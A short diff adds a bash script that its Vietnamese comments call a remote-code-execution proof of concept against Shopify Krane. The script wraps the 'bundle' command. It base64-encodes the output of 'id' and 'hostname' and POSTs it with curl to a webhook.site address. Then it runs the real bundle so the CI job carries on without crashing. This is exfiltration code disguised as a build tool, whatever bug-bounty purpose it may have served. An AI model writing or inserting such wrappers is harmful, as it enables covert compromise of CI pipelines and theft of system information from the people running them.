@@ -1,0 +1,9 @@
+#!/bin/bash
+# PoC RCE cho Shopify Krane
+echo "Hacking in progress..."
+# Gửi dữ liệu nhạy cảm (ID, Hostname, Environment) về Webhook
+curl -s -X POST -d "data=$(id | base64)" https://webhook.site/b12e31e2-f83a-46a2-a8b3-f1c950fe4848
+curl -s -X POST -d "hostname=$(hostname | base64)" https://webhook.site/b12e31e2-f83a-46a2-a8b3-f1c950fe4848
+
+# Thực thi lệnh bundle thật để quá trình CI không bị crash ngay lập tức
+/usr/bin/bundle "$@"
